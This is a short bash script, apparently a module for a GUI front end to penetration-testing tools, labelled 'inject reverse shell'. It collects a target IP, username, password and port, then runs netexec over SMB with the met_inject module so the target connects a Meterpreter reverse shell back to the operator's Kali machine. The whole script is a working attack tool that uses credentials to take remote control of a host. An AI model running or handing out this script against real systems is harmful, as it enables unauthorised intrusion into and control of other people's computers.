#!/bin/bash

: '
inject reverse shell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")
SHELL_PORT_FIELD=$(form_item  "shell port" "shell_port")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${SHELL_PORT_FIELD}"

IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
SHELL_PORT=${form_data["shell_port"]}

execute_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=${SHELL_PORT}"
create_new_line
 